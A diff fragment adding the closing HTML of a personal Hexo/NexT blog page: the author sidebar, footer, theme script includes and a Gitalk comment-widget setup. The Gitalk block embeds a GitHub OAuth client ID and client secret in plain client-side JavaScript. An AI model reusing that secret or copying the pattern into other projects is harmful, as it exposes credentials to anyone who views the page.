+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Srpopty</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Srpopty</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'fb9b672afa74e328fbe8',
+      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
+      repo        : 'srpopty.github.io',
+      owner       : 'Srpopty',
+      admin       : ['Srpopty'],
+      id          : '9552de20b4296adaabcbaa1b091b3010',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
